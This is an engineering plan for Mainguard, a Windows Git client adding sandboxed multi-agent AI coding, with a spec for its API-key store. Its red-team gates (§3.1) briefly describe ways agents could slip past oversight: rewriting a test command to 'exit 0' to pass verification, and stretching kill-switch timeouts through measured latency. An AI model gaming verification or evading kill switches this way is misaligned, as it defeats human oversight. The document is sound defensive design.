# Mainguard — Master Implementation Document v2 (Agent Platform)

**Date:** 2026-07-07 · **Revision 2 (same day):** full-product planning pass — the competitive-match wave (§5), the Vibe product and cloud/ecosystem waves (§6–§7) are now fully specified; nothing in the product remains at strategy level. Driven by the MergeLoom deep-dive and the complete competitor feature inventory (see Market inputs).
**Branch:** this document lives on — and all its tasks are built on — the **`phase2`** branch (see §0.0).
**Supersedes for execution purposes:** §5 ("Later phases") of `Mainguard_Master_Implementation_Document.md` and the strategy-level specifications of workstreams F6, G, H, I, J, K in `Mainguard_Implementation_Strategy.md` (which remains the strategic index).
**Market inputs:** `docs/market-analysis/Mainguard_Market_Research_v2.md`, `Mainguard_Viability_And_Differentiation_2026-07.md`, `Mainguard_Naming_And_Competitive_Landscape_2026-07.md`, and the per-competitor refresh `Mainguard_Competitor_Research_2026-07-07.md`, plus the second-pass research `Mainguard_MergeLoom_Deep_Dive_2026-07-07.md` (exhaustive feature/pricing dive on the most directly overlapping competitor) and `Mainguard_Feature_Inventory_2026-07-07.md` (complete feature inventory of every competitor incl. classic Git clients, with match/skip rulings). §1.2 records exactly how those findings changed the plan.

---

## 0. How to use this document

### 0.0 Branch policy (binding)

The core Git client (everything specified in Master Doc v1, tasks T-01…T-33) lives on **`main`** and is in release-hardening mode: **bug fixes, UI polish, and test work for v1 features target `main`**, one issue per PR, exactly as before.

Everything in *this* document — the agent platform (Phases 6–9), the installer, and the market-driven additions — is built on the **`phase2`** branch:

1. `phase2` tracks `main`: merge `main` into `phase2` routinely (at minimum after every v1 fix batch). Conflicts are resolved on `phase2`, never by rebasing published history.
2. Task branches fork from `phase2` and their PRs target `phase2` (`gh pr create --base phase2`).
3. When the core client is declared released, `phase2` merges into `main` once, and `main` becomes the single center again. This document then applies to `main` and this section collapses to "one task = one PR".
4. Nothing in this document may be merged to `main` before that point. A v1 fix discovered while working here is cherry-picked out to a `main`-targeted PR.

### 0.1 If you are IMPLEMENTING a task

Identical protocol to Master Doc v1 §0.1, restated:

1. Find your task in §4–§7 (`P2-xx` / `P3-xx` / `P2-Cx`, ordered in §3). Do not start a task whose *Depends on* list is not fully merged to `phase2`.
2. The **Contract** is binding (namespaces, signatures, parameter names/order). **Implementation steps** are a known-good path; deviations must still satisfy every **Invariant**.
3. Build after each step; never reorder steps touching the same file.
4. Every **Edge-case matrix** row is part of the definition of done and has a required test.
5. The **Required tests** block in each task is the test contract (v2 embeds it inline instead of a separate companion doc). Tests land **in the same PR**.
6. Run the task's **Reviewer verification script** yourself before opening the PR.
7. Never bundle two task IDs in one PR.

### 0.2 If you are REVIEWING a PR for a task

Same priority order as v1 §0.2: Contract → Invariants → Rejection triggers → Acceptable variations (never request changes for these) → Required tests green in CI → run the verification script (< 5 min).

### 0.3 Global PR rules

1. One task = one PR; foundation work never bundled with feature work.
2. PR description links the task ID, lists manual verification performed (output/screenshots), names the tests added.
3. Any PR touching `Mainguard.Agents/Services/GitServices.cs` runs the full suite locally before pushing; any PR touching terminal code runs the P2-04 harness.
4. Security-relevant PRs (P2-01, P2-07, P2-08, P2-11, P2-15, P2-22) execute their listed security checks and paste the evidence into the PR; the reviewer re-runs at least one.
5. No PR may reintroduce: `cmd.exe` shells, secrets in argv/URLs/logs/exception text, `BuildSignature` call sites outside `GetSignature`, blocking Git/network work on the UI thread, `Directory.Delete` in discard paths, untyped throws, **Windows bind mounts into containers**, **`wsl --shutdown`**, or bare `git push --force`.

---

## 1. Baseline — what exists on `main` (2026-07-07)

### 1.1 The shipped Git client

Master Doc v1 is **fully implemented and merged**: audit fixes 1.1–1.13, tasks T-01…T-22, and the host-integration extension tasks T-23…T-33 (PR/issue/review/checks/notifications/releases panels, PR-to-worktree checkout, pre-commit safety scanner, conventional-commit composer, blame→PR jump). The suite stands at **1,042 tests, 0 skipped, deterministic** (parallelization disabled by design). Key structural facts an implementer must not fight (unchanged from v1 §1):

- **No DI container.** Services are instantiated directly; `App` exposes a static `Settings`.
- All LibGit2Sharp access goes through `IGitService.ExecuteWithRepo(...)`; never hold a `Repository` long-lived.
- Policy split (G-7 of v1): LibGit2Sharp for reads/status/commit/diff; git CLI for interactive rebase, worktrees, partial staging, force-with-lease, LFS, stash pop/apply — via the hardened `RunGit` family only.
- Typed exception hierarchy `MainguardException` → (`MergeConflictException`, `GitIdentityMissingException`, `AuthenticationRequiredException`, `RemoteNotFoundException`, `GitOperationException`, …).
- Host API access goes through **one audited transport per host** (`GitHubApiClient`) — token in the `Authorization` header only; a second copy is a rejection trigger.
- Secrets: `SecureKeyring` (DataProtection, DPAPI-wrapped key ring on Windows), keys `token_<host>` / `sshpass_<keypath>`; `CredentialResolver` is the single SSH-vs-token decision point.
- `Mainguard.slnx`, .NET 10 (`global.json` pinned 10.0.100), Avalonia 11 + CommunityToolkit.Mvvm, xUnit in `Mainguard.Tests` (references Core *and* App — headless Avalonia harness TI-00 exists).
- Five switchable color themes; design tokens only (`{DynamicResource}`), component classes over raw colors; **Repository Map in `AGENTS.md` must stay current with every file add/move/delete.**

### 1.2 What the July 2026 market findings changed (traceability)

| Finding (doc) | Plan change in v2 |
|---|---|
| "Spawn agents in worktrees" is commoditized — native in Claude Code, GitKraken Agent Mode, GitHub Copilot app (Naming §2, Viability §1.1–1.2) | Orchestration UX is built to parity, not led with; the **merge/verification pipeline is promoted to the product spine** (P2-10 before any coordinator polish) |
| Verification is the bottleneck: PR review time +91%, 46% distrust agent output (Viability §1.3) | **P2-10 merge queue + verification runs** and **P2-11 risk-ranked review cockpit with per-hunk provenance** are new top-priority product tasks, not infrastructure |
| EU AI Act enforcement window opens 2026-08-02 (Viability §1.4) | **P2-15 hash-chained audit** and **P2-16 SIEM export** pulled forward from "post-GA enterprise" into the same milestone as the coordinator |
| Vendor lock-in risk + Anthropic subscription-OAuth ban (Market v2 §5.4) | **P2-12 external agent PR intake** (Codex/Jules/Copilot PRs through the same verify→review→merge pipeline) added — it was in no earlier plan; agent-agnostic pinned **adapter channel** (P2-22) is a survival requirement; API-key BYOK is the primary documented path with ToS notice (P2-01) |
| Rate limits break the first-run experience (Market v2 §5.4 #2) | **P2-08 AI Gateway is launch-blocking**, not an enterprise add-on |
| Windows/WSL2 flank is unserved; Conductor is Mac-only (Viability §1.2, D-4) | Hardened WSL2 sandbox + published security architecture (P2-07, P2-17) kept P0 and marketed |
| GitKraken predictive conflict detection is single-user (Viability D-5) | **P2-19 cross-worktree conflict radar** (N live agent worktrees vs each other and main) added as a new differentiator |
| Agent WIP commits are unreviewable noise (Viability D-5) | **P2-20 agent commit-stream curation** (one-click squash checkpoints → conventional commits, built on T-08 rebase) added |
| Hardware caps local swarms at 4–6 agents (Market v2 §6) | Honest admission control (P2-08); **cloud worktrees promoted from "pivot" to roadmap** (P2-25 guardrails now, beta ≤ 2 quarters post-GA) |
| Vibe Mode local install can't win (Market v2 §5.1) | K-stream stays post-v1 and cloud-first; only the shared `VibeOrchestrator` engine (P2-26) ships with the desktop platform |
| AI commit messages / chat-with-repo are GitKraken-owned checkboxes (Viability §3) | **Deliberately not built.** Out of scope in v2 exactly as in v1 |
| Client-parity gaps vs GitKraken/Fork power users (Backlog A-1…A-3) | Client-parity track **P2-C1 bisect / P2-C2 global search / P2-C3 multi-repo dashboard** — the dashboard doubles as the swarm control surface |
| **Agent Trace** attribution standard emerged (Cognition/Cursor RFC, backed by Cloudflare/Vercel/Google/Amp; no product renders it yet) (Competitor refresh §b) | P2-11 provenance is built on **Agent Trace as the interchange format** — Mainguard emits it from the orchestrator and is the **first review UI to render it**; commit trailers remain the fallback for non-emitting agents |
| Docker Sandboxes (sbx) went GA (2026-01-30) with microVM isolation + default-deny egress presets **that work on Windows** (Competitor refresh) | P2-07 keeps the native WSL2 sandbox as the zero-extra-install default and adds **sbx as an optional "maximum isolation" backend** — the moat is the integration (worktree+queue+audit+UI), not the hypervisor |
| Jules has a public API + GitHub Action; Codex/Devin PR producers multiply; Kepler ships PR-based task intake (Competitor refresh §e) | **P2-12 external PR intake accelerated into M7 core** (it is cheap to build now and the field is empty at the vendor-neutral level) |
| GitHub's server-side merge queue is the only stale-invalidation analogue — server-side, CI-bound, PR-only, not agent-aware (Competitor refresh §a) | P2-10 positioning sharpened: works **pre-PR, locally, across N agent branches, without CI round-trips, and for repos not on GitHub** |
| EU AI Act Art. 12 requires logging/traceability but not literally cryptography (Competitor refresh §c) | P2-15 split: ship the **evidence pack** (hash chain + identity + `audit verify` + SIEM feed) for the 2026-08-02 marketing moment; RFC 3161 anchoring may trail; claims say "audit-grade/tamper-evident", never "legally required crypto" |
| Sculptor's **Pairing Mode** (one-click sync of a sandboxed agent's work into the local repo) is the best-in-class hand-back UX (Competitor refresh §10) | P2-11 cockpit includes a pairing-style **"bring this branch local"** action (fetch agent branch → local worktree/checkout via existing T-29 plumbing) |
| **MergeLoom (mergeloom.ai)** — governance-positioned "-Loom" competitor found 2026-07-07 (Competitor refresh) | Not an engineering task: **naming risk escalated** — flagged to the owner; the naming decision doc should treat this as a forcing function |

**Second research pass (2026-07-07, owner directive: match every competitor feature, then beat it):**

| Finding (doc) | Plan change |
|---|---|
| MergeLoom's verified feature set: multi-tracker intake w/ approval routing, Context Engine, six-gate validation (clarity check, repair loop, AI reviewer, Diff Guard), Agent Fleets w/ PR caps, self-learning, per-run cost telemetry (MergeLoom deep-dive §1) | **P2-27** ticket-to-verified-PR pipeline, **P2-34** context vault, **P2-35** verification depth (repair loop + Diff Guard + AI review pass), **P2-30** fleets w/ caps, **P2-36** governed lessons, cost-per-merged-change in P2-08 telemetry — each with a leapfrog beyond parity (their architecture has no merge queue, no sandbox story, no review UI, no audit integrity) |
| MergeLoom weaknesses: headless/web-only, cloud=Anthropic-only, self-hosted still phones home, Linux/K8s-only worker, no RBAC/SOC2/API, £2–4/PR meter, 1-person company (deep-dive §6) | Positioning + pricing attack recorded in the deep-dive §5; engineering answer is the local-first sandbox + queue + cockpit already specified |
| Uniform gaps across all majors: issue-tracker intake, scheduled automations w/ review queue, session kanban, dev-server preview + ports, session checkpoints/forking, inline-diff-comments-to-agent (Feature inventory Part 2/4) | **P2-27…P2-33** wave + **P2-37** checkpoints/fork/tree-snapshots, **P2-38** review loop-closers, **P2-39** orchestration UX pack, **P2-40** composer conveniences |
| Automation surface is the biggest structural gap — Superset/Jules/Codex ship CLI+SDK+MCP/API (inventory §E) | **P2-32** promotes the daemon contract to a public CLI/SDK/MCP/REST product; GitHub Action as a consumer |
| Mobile/remote monitoring shipping at 4 competitors (inventory §H) | **P2-41** daemon-served LAN/web remote dashboard (self-host model; store app later) |
| Classic-client gaps vs Tower/Fork/Sublime/GitButler/lazygit (inventory §11/§F) | **P2-C4** split-into-branches wizard + stacked restacking, **P2-C5** polish pack (standalone mergetool, partial stash UI, patch files/WIP share, templates/gitmoji, diff search, AI commit message checkbox — the last revising the earlier skip: it is now a parity checkbox) |
| 15 novel no-competitor features proposed (inventory Part 3) | Adopted: **P2-42** merge-train simulation + verification cache + test-impact ordering, **P2-43** per-agent signing identities, **P2-44** sandbox health/exfiltration panel, **P2-45** agent flight recorder; folded into existing specs: quarantine remotes (P2-06), semantic lockfile diff (P2-11), review receipts/coverage + curation-surviving review state (P2-38), symbol-level radar (P2-19), review-sprint mode (P2-11), merge-decision replay (P2-15), crash forensic resume (P2-37) |

---

**2026-07-12 baseline addendum (Lane H engineering pass).** The shipped client received a verified engineering pass on `phase2` (PR #157): per-HEAD analytics caching, O(1) commit-graph lane routing (output oracle-pinned identical), theme-following diff syntax highlighting, a bounded `index.lock` retry inside `ExecuteWithRepo`, merge blank-line conservation, and property tests for the pure engines (final suite 1115/1115 on a zero-warning build). The decisions are recorded as [ADR-001…007](../ADRs.md) and are part of the baseline this document builds on.

## 2. Global engineering invariants (every PR, every task)

G-1 … G-10 from Master Doc v1 §2 apply unchanged. v2 adds:

| # | Invariant | Reviewer check |
|---|---|---|
| G-11 | **No Windows-path bind mounts into containers, ever.** The only cross-boundary repo data path is Git objects (fetch/push between the Windows repo and the ext4 bare repo) | `docker inspect` on any agent container shows zero `/mnt/c`, `drvfs`, or UNC mounts (P2-06/P2-07 tests assert this) |
| G-12 | **Never `wsl --shutdown`** (kills the user's personal distros); lifecycle is `--terminate MainguardEnv` → poll → `--unregister` | `grep -rn "wsl --shutdown\|--shutdown" Mainguard.Agents/ Mainguard.Server/ installer/` → 0 hits |
| G-13 | Secrets (API keys, tokens, passphrases) cross process boundaries only via: OS keyring, tmpfs files (mode 0400), or authenticated gRPC message fields explicitly marked `// SECRET` and excluded from logging interceptors. Never argv, never env files on persistent disk, never proto logs | grep new `ProcessStartInfo`/proto/log sites; the gRPC logging interceptor has a field-mask test |
| G-14 | Every proto change is **transport-agnostic**: no localhost assumptions, no daemon filesystem paths leaking to the client except opaque handles | review `Mainguard.Protos` diffs; WAN-latency CI job (P2-25) stays green |
| G-15 | Agent containers: `no-new-privileges`, userns remap, memory+pids limits, default-deny egress. A container spawned without the hardened spec is a bug, not a variation | P2-07 verification script |
| G-16 | **No `docker build` at runtime** (severs PTYs); toolchains sideload via `devbox add` into the static base image | grep daemon code for `ImageBuild` |
| G-17 | Every agent-initiated ref mutation, spawn/kill, plan approval, and merge decision emits an audit event (hash-chained once P2-15 lands; plain journal rows before that) | new mutation RPCs show an `AuditLog.Append` call in the same change |
| G-18 | The UI never talks to Docker/WSL/PTYs directly — only through the daemon's gRPC surface. The daemon never renders UI strings (typed error codes + params; the client localizes) | review: no `Docker.DotNet`/`Porta.Pty` references in `Mainguard.App.Shell` |

---

**Design-system invariant (2026-07 design pass).** Every UI task in this document conforms to [`docs/design/DesignSystem.md`](../../design/DesignSystem.md) — the corrected lane palette, the state-encoding icon gates, the accessibility gates, and the motion grammar — and finds its surface specification through the [design hub](../../design/README.md). Where a task section below carries a **Design decisions** block, those rulings are binding on implementation.

## 3. Build order and dependency graph

Two parallel tracks. The **platform track** is strictly ordered; the **client-parity track** (P2-C1…C3) has no platform dependencies and can interleave anywhere (they also make good "first task on phase2" warm-ups).

```
PLATFORM TRACK (M6–M7.5)
P2-01 BYOK key store + health check      (no deps)
P2-02 Daemon + gRPC v1 contract          (no deps)
P2-03 Terminal engine, interim PTY       (P2-02)
P2-04 VT conformance & replay harness    (P2-03; gates P2-03 and P2-18)
P2-05 MainguardOS bootstrapper             (P2-02)
P2-06 Repo provisioner + quarantine remotes (P2-02, P2-05)
P2-07 Sandbox hardening + egress         (P2-05, P2-06; optional sbx backend)
P2-08 AI Gateway + admission + reconcile (P2-01, P2-07)   ← launch-blocking
P2-09 Agent lifecycle + yield + rebase   (P2-06, P2-07)
P2-10 Merge queue + verification runs    (P2-09)          ← product spine
P2-11 Review cockpit: risk rank + provenance + flagged gate (P2-10)
P2-12 External agent PR intake           (P2-10)          ← accelerated P0
P2-13 Activity bar & docking UI          (P2-02, P2-03)
P2-14 Plan approval + dual-mode orchestration (P2-08, P2-09, P2-13)
P2-15 Hash-chained audit log (+ audit replay) (P2-14; start after P2-10)
P2-16 SIEM exporter                      (P2-15)
P2-17 Source-available split + network transparency (P2-07)
P2-18 Terminal target engine (libvterm)  (P2-04 green; before beta)
P2-19 Cross-worktree conflict radar (line → symbol level) (P2-06)
P2-20 Agent commit-stream curation       (P2-09)
P2-21 Installer: diagnostics → OOBE → payload (P2-05)
P2-22 Windows integration + adapter channel + teardown (P2-21)
P2-23 RBAC / SSO / SCIM                  (P2-15, P2-16)
P2-24 Supply-chain & secrets compliance  (P2-10, P2-01)
P2-25 Cloud worktrees guardrails (continuous; impl = P3-06)
P2-26 VibeOrchestrator engine (shared)   (P2-03, P2-08)

COMPETITIVE-MATCH WAVE (M7.75 — §5; parity + leapfrog)
P2-27 Ticket-to-verified-PR pipeline     (P2-10, P2-14)   ← MergeLoom counter, P0
P2-28 Multi-repo tasks + epic slices     (P2-C3, P2-06, P2-27)
P2-29 Session board & candidate comparison (P2-13)
P2-30 Automations, scheduling & agent fleets (P2-14, P2-27)
P2-31 Dispatcher & multi-candidate runs  (P2-08, P2-14, P2-29)
P2-32 Public CLI + SDK + MCP server + webhooks/chat (P2-02, P2-30)
P2-33 Dev-server preview & port panel    (P2-26 taps)
P2-34 Context vault (cross-repo index + evidence packs) (P2-06) ← P0
P2-35 Verification depth: repair loop + Diff Guard + AI review (P2-10, P2-11) ← P0
P2-36 Governed lessons & repo memory     (P2-11, P2-15, P2-34)
P2-37 Session checkpoints + tree snapshots + forking (P2-02, P2-09; upgrades T-19) ← P0
P2-38 Review loop-closers: comments→agent, receipts, coverage (P2-11, P2-09) ← P0
P2-39 Orchestration UX pack: queue/dispatch/search/plan-tree (P2-02, P2-13, P2-14)
P2-40 Composer & review conveniences     (P2-03, T-13)
P2-41 Remote dashboard (LAN/web, paired devices) (P2-02, P2-32) — M8
P2-42 Merge-train simulation + verification cache (P2-10, P2-19)
P2-43 Per-agent signing identities       (T-15, P2-09, P2-15)
P2-44 Sandbox health & exfiltration panel (P2-07, P2-17)
P2-45 Agent flight recorder              (P2-03/18, P2-39, P2-15) — M8
P2-46 Runtime toolchain resolver (A6)    (P2-07, P2-06, P2-17) — v1.x (lead)
P2-47 Alpha integration pass (wiring)    (P2-09/11/12/13/14) — M7 (Alpha requirement)
P2-48 Unified install (single-exe+OOBE)  (P2-21, P2-22, P2-47) — Beta v0.2
P2-49 Agent-CLI lifecycle: update/revert (P2-22, P2-48) — Beta v0.2 — amends P2-22 §J-5

WAVE 3 — VIBE PRODUCT (M9 — §6)
P3-01 Auto-checkpoints + agent conflict resolution (P2-26, P2-09, P2-37)
P3-02 Escalation UX (triage)             (P3-01, P2-26)
P3-03 Vibe UI: mode toggle, chat, live preview (P3-01, P3-02, P2-13)
P3-04 One-click deployment               (P3-03, P2-22)
P3-05 Mainguard Web (hosted Vibe)          (P3-03, P3-06)

WAVE 4 — CLOUD, ECOSYSTEM, HOST PARITY (M10 — §7)
P3-06 Cloud worktrees implementation     (P2-25 green, P2-02…P2-10)
P3-07 Host parity: a GitLab · b Bitbucket · c Azure DevOps (T-23…T-28 seams; anytime)
P3-08 Skills marketplace (format-first)  (P2-22, P2-14)
P3-09 Governed CI/CD janitor (org-scale) (P2-10, P2-12, P2-30)
P3-10 Team collaboration layer           (P2-15, P2-16, P2-23, P3-06)

CLIENT-PARITY TRACK (any time; may target main pre-merge*)
P2-C1 Interactive bisect assistant       (T-19)
P2-C2 Global fuzzy search                (T-18, T-23/T-24)
P2-C3 Multi-repo dashboard + cross-repo "My Work" (T-10)
P2-C4 Split-into-branches wizard + stacked restacking (T-06, T-08, T-19, P2-37)
P2-C5 Client polish pack (mergetool mode, difftool, partial stash, patches/WIP share, templates, diff search, AI commit msg) (shipped surfaces; item 1 needs P2-32 CLI)
```

\* Client-parity tasks touch only v1 systems. If shipped before the phase2 merge they may target `main` as ordinary client features — decide per task with the repo owner; default is `phase2`.

**Milestones:** M6 = P2-01…P2-08 (one hardened agent, gateway-protected). M7 = P2-09…P2-14 + P2-18, P2-21, P2-22 (the verified swarm + installer). M7.5 = P2-15…P2-17, P2-19, P2-20 (trust: audit + radar + curation — the audit pair targets **before 2026-08-02**). **M7.75 = the competitive-match wave (§5)** — P2-27/P2-34/P2-35/P2-37/P2-38 are its P0 spine (the MergeLoom counter + the uniform category gaps); the rest parallelize. M8 = P2-23…P2-26 + P2-41 + P2-45. M9 = Wave 3 (§6). M10 = Wave 4 (§7). Client-parity anywhere.

### 3.1 Launch-blocker hardening gates (RT-D1…RT-D4 — binding, from OD-R5)

The Lane-C red-team plan (`Mainguard_Orchestration_RedTeam_Plan.md` §4) and the Risk Register (OD-R5) declare four seams **launch-blocking**, but they were previously scheduled only in those subordinate docs. They are now sequenced here as **explicit M7/M7.5 exit criteria** — a milestone does not exit until its listed guard test is green. Each folds into an already-named owning task as a required acceptance criterion; no new task is created.

| Seam | Threatens | Folds into (owning task) | Acceptance criterion (guard test) | Gate |
|---|---|---|---|---|
| **RT-D1** crash-mid-merge exactly-once reconciliation | S-3 | **P2-10** (+ T-19 journal as a reboot-reconciliation input; P2-08 reconciler ordering: merge-reconcile before admission) | On daemon start, `IMergeQueue` reconciliation replays the `ForegroundMergeService` T-19 Windows-side journal for any repo with a merge lease outstanding at crash time and synthesizes the `ConfirmMerge` idempotency record from a committed-but-unrecorded merge **before** accepting a new `BeginMerge`. `DaemonCrashMidMerge_ShouldRecoverToExactlyOnceOrNone` | **M7 exit** |
| **RT-D2** verification-command provenance + gate | S-3/S-4 | **P2-10** (`VerificationRecord` gains resolved-command + config-file-hash provenance) + **P2-11/P2-35** (a change to the test command vs the `main`-side baseline is a **dedicated must-acknowledge flagged item** before `CanMerge` is true; optional out-of-branch human-owned pin) | `GamedTestCommand_ShouldBeFlaggedBeforeSilentMerge` — a branch that rewrites its test to `exit 0` cannot ride a silent merge | **M7 exit** |
| **RT-D3** kill-switch audit-gap self-declaration | S-7 | **P2-14** (kill-switch) + **P2-15** (recovery-time marker) | Kill switch stays non-blocking (freeze-then-audit best-effort), but on audit-store recovery the daemon appends a chained `killswitch_audit_gap{killEpochId, observedAt}` so a kill during an audit outage is tamper-evident, not a silent absence. `KillSwitchDuringAuditOutage_ShouldMarkGapOnRecovery` | **M7.5 exit** |
| **RT-D4** `RttBudget` hard ceiling on safety timeouts | S-7 / §2.8 | **P2-14** (kill-switch bound) + OPS §2.8 | Every safety-critical control timeout is `min(ceiling, max(floor, k×RTT))` with a **fixed absolute ceiling independent of the measured EWMA**, so a supervisor-influenced RTT cannot stretch the kill-switch/yield-to-pause path; an anomalous RTT spike feeds A3 `Unresponsive` (P2-08) rather than only a longer deadline. `KillSwitchBound_HardCeiling_IndependentOfRtt` | **M7 exit** |

Until each box's guard test is green at its named gate, the milestone does not exit and the swarm does not ship (the red-team §4 checklist's ship rule, now binding here).

### 3.2 Release ladder (2026-07-12 — binding planning)

Chronological release milestones mapped to task IDs. **Principle:** the barebones "agents + orchestrator + PR-merge without the verified queue" state is an **internal dogfood checkpoint, not a shipped release** — safe-to-merge is the product thesis and the moat, so the first *external* release already includes the verified merge queue. Each pre-v1 release adds ≥1 substantial capability. **v1.0 = the core idea implemented to a high standard; the competitive-match wave, Vibe, cloud, and enterprise features are explicitly deferred to later versions.**

| Release | Adds (task IDs) | Capability gained |
|---|---|---|
| **Dogfood** (internal, *not shipped*) | through **P2-09** (+ pull **P2-13** forward — its deps are only P2-02/03) | Spawn multiple agents, watch them, merge via the existing v1 PR flow (fetch the agent branch over the P2-06 sync remote → push + PR with T-23). Unsafe merge → internal only. |
| **Alpha v0.1** (first external) | **P2-01–11, 13, 14, 21, 47** | Agents in hardened sandboxes + **verified merge queue (P2-10)** + risk-ranked review cockpit (P2-11) + activity UI (P2-13) + orchestrator/plan-approval (P2-14), **made runnable turnkey by the P2-21 installer** (diagnostics + OOBE + payload pipeline — provisions the MainguardOS VM so agents spawn without manual WSL/Docker setup) and **assembled into a running product by the P2-47 integration pass** (the features are built component-first behind seams; P2-47 is what makes them run end-to-end — Alpha does not ship without either). First release honest to the safe-merge thesis. (P2-21 pulled forward from Beta v0.2 on 2026-07-13: Alpha's runnable form requires it; its manual install matrix still runs on real Windows.) |
| **Beta v0.2** | **P2-18, 22** | Installer part 2 — Windows integration + clean uninstall (P2-22) — on top of Alpha's P2-21 base, plus production terminal (libvterm, P2-18). First fully-polished non-dev-installable release; the deferred WSL/terminal/installer manual matrices run here. |
| **Alpha v0.1** (first external) | **P2-01–11, 13, 14, 47** | Agents in hardened sandboxes + **verified merge queue (P2-10)** + risk-ranked review cockpit (P2-11) + activity UI (P2-13) + orchestrator/plan-approval (P2-14), **assembled into a running product by the P2-47 integration pass** (the features are built component-first behind seams; P2-47 is what makes them run end-to-end — Alpha does not ship without it). First release honest to the safe-merge thesis. |
| **Beta v0.2** | **P2-18, 22, 48, 49** | The **one-launch packaged product (P2-48)** — single self-updating exe + in-app Avalonia OOBE over P2-21's Alpha provisioning machinery — plus Windows integration (P2-22) and the production terminal (libvterm, P2-18). First non-dev-installable release; the deferred WSL/terminal/installer manual matrices run here. (P2-21 provides the runtime and now ships in Alpha; P2-48 is its packaged UX.) **P2-49** governs the agent CLIs P2-48 installs: user-owned updates, one-click offline revert, and channel-delivered compatibility fixes — a Mainguard-installed CLI is the same CLI you'd have without Mainguard (amends P2-22 §J-5's permanent pin). |
| **Beta v0.3** | **P2-12, 15, 16** | Agent-agnostic PR intake (Codex/Jules/Copilot) + tamper-evident audit + SIEM (the EU-AI-Act / trust story). |
| **Beta v0.4** | **P2-17, 19, 20** | Source-available + network transparency, cross-worktree conflict radar, agent commit-stream curation. **RT-D1…D4 launch-blocker gates go green here.** |
| **v1.0 — FULL** | all of **P2-01…P2-22** solid + RT-D1…D4 green | The core idea — safe autonomous multi-agent merge orchestration on Windows/WSL — at a high standard. |

Because features are built roughly in numeric order, some later-release features land earlier (e.g. P2-12 < P2-14, so it will typically be done by the Alpha) — that is a bonus, not a reordering; the table lists the *minimum* each release requires.

**Explicitly NOT in v1** (the "extras"): P2-23/24 (RBAC/SSO/SCIM, supply-chain compliance), P2-25/26 (cloud guardrails, Vibe engine), the entire competitive-match wave **P2-27…P2-45**, **P2-46** (runtime toolchain resolver — v1 ships with P2-07's pre-baked toolchain only), the Vibe product **P3-01…P3-05**, cloud worktrees **P3-06**, and host-parity/marketplace/janitor/team-collab **P3-07…P3-10**. The client-parity track **P2-C1…C5** is independent and slots into the client opportunistically at any release.

**Post-v1:** v1.x **leads with P2-46** (daemon-mediated runtime toolchain resolver — the A6-clean successor to P2-07's pre-baked toolchain, letting agents add arbitrary tools at runtime with no git-host egress hole), then the competitive-match wave (P2-27…P2-45) in themed chunks + P2-23/24 for the enterprise tier; **v2.0** = the Vibe product (P3-01…05) + cloud worktrees (P3-06) — a new zero-knowledge audience, hence a major version; v2.x/v3 = host parity (P3-07), skills marketplace (P3-08), CI/CD janitor (P3-09), team collaboration (P3-10).

---

# 4. TASK SPECIFICATIONS

---

## P2-01 — BYOK key store + key health check (F6)

**Milestone:** M6 · **Priority:** P0 (agents need keys before anything else works) · **Depends on:** nothing.

### Why

Phase-7 agents consume LLM API keys. Keys must live in the OS keyring (never plaintext config), be validated at entry so the user learns their realistic concurrency ceiling *before* the first 429, and be injectable into sandboxes via tmpfs only. The Anthropic subscription-OAuth ban (enforced 2026-04-04) makes the API-key path the primary documented one, with a recorded ToS acknowledgment for CLI-OAuth users.

### Contract (must exist exactly)

```csharp
// Mainguard.Agents/Security/ISecureKeyStore.cs
namespace Mainguard.Agents.Security;

public interface ISecureKeyStore
{
    void Set(string key, string secret);
    string? Get(string key);
    void Delete(string key);
}
// SecureKeyring implements ISecureKeyStore (Set/Get/Delete delegate to Save/Retrieve/DeleteSecret).
// Key names for LLM keys: "llm_anthropic", "llm_openai", "llm_<provider>" (filesystem-safe, mirrors token_<host>).
```

```csharp
// Mainguard.Agents/Security/ApiKeyHealthService.cs
public sealed class KeyHealth
{
    public bool IsValid { get; init; }
    public string? FailureReason { get; init; }          // token-scrubbed
    public int? RequestsPerMinute { get; init; }         // from provider rate-limit headers
    public int? TokensPerMinute { get; init; }
    public int EstimatedConcurrentAgents { get; init; }  // conservative mapping table in code
}
public sealed class ApiKeyHealthService
{
    public ApiKeyHealthService(HttpMessageHandler? handler = null);   // seam for offline tests
    public Task<KeyHealth> CheckAsync(string provider, string apiKey, CancellationToken ct);
}
```

```csharp
// Mainguard.Agents/Security/CredentialInjector.cs  (contract now; daemon side consumes it in P2-07)
public static class CredentialInjector
{
    /// <summary>Env-file content for an agent (KEY=value lines), built in memory only.</summary>
    public static string BuildEnvFileContent(IReadOnlyDictionary<string, string> secrets);
}
```

Plus `ApiKeySettingsViewModel` + settings page (masked entry, provider dropdown, per-provider Save/Delete, health result line) and the CLI-OAuth ToS notice dialog whose acknowledgment (provider, timestamp) persists via `AppDbContext` (new table + migration).

### Implementation steps

1. Extract `ISecureKeyStore`; `SecureKeyring : ISecureKeyring, ISecureKeyStore`. No behavior change; the interface is what the daemon and P2-24 backends implement later.
2. `ApiKeyHealthService.CheckAsync`: Anthropic → `POST /v1/messages` with `max_tokens: 1` and the key in the `x-api-key` header; OpenAI → `GET /v1/models`, `Authorization: Bearer`. Parse rate-limit headers (`anthropic-ratelimit-requests-limit`, `-tokens-limit`; OpenAI `x-ratelimit-*`). Map to `EstimatedConcurrentAgents` via a static table (document the table in code; be conservative). 401/403 → `IsValid=false` with the provider's message **scrubbed of the key** (reuse the `GitHubApiClient.Redact` pattern — do not duplicate it: move `Redact` to a shared internal `Http/RedactionExtensions` if needed).
3. Settings page: masked `TextBox` (`PasswordChar`), validate-on-save (invalid key is **not stored**), success renders "Key valid — supports ~N concurrent agents". Null out local copies after storing.
4. ToS notice: shown when the user selects "use my Claude subscription (CLI OAuth)" — text states the April-2026 restriction and that API-key is the supported path; acknowledgment recorded before the option activates.
5. `CredentialInjector.BuildEnvFileContent`: pure string building (`ANTHROPIC_API_KEY=...` etc.), newline-terminated, no quoting games (values are opaque tokens; reject values containing `\n` with a typed throw).

### Edge-case matrix

| Case | Required behavior |
|---|---|
| invalid key | inline error, key absent from keyring and from any log/exception |
| valid key, headers missing | `IsValid=true`, ceilings null, agents estimate = 1 (conservative floor) |
| provider unreachable | typed failure, retry affordance, nothing stored |
| key value containing newline | typed `ArgumentException` from the injector (env-file integrity) |
| re-save over an existing key | old value overwritten atomically, health re-checked |
| delete | keyring entry gone (verify file removed) |

### Invariants (MUST)

1. The key appears only in: the keyring, the in-memory HTTP header of the health check, and (later) tmpfs env content. Never argv, settings JSON, logs, or exception text.
2. Health check is fully offline-testable through the `HttpMessageHandler` seam (recorded fixtures).
3. An invalid key is never persisted.
4. ToS acknowledgment persists across restarts and is queryable (P2-15 will chain it).

